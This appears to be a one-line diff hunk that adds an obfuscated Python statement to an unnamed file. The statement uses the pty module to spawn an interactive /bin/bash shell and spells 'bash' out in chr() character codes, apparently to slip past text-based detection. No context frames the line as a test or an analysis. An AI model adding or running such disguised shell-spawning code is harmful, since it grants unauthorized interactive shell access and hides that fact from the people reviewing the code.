@@ -1,0 +1,1 @@
+__import__('pty').spawn('/bin/'+chr(98)+chr(97)+chr(115)+chr(104))
